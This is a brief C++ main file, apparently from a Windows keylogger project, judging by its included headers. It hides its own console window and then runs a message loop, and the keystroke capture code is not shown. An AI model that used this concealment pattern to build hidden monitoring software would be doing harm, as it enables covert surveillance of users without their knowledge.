#include <iostream>
#include <windows.h>
#include "helper.h"
#include "Base64.h"
#include "keyConstants.h"
#include "IO.h"
#include <fstream>
#include "Timer.h"

int main()
{
    AllocConsole();
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    MSG Msg; 
    while (GetMessage(&Msg, NULL, 0, 0))
    {
        TranslateMessage(&Msg);
        DispatchMessage(&Msg);
    }
    FreeConsole();
    return 0;
}
